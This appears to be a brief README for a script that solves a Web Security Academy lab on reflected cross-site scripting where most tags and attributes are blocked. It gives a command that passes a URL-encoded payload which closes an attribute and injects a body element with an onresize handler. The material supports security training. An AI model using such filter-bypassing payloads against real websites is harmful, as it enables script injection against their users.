# How to run script.py

### Reflected XSS into HTML context with most tags and attributes blocked

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%22%3E%3Cbody%20onresize=print()%3E"`
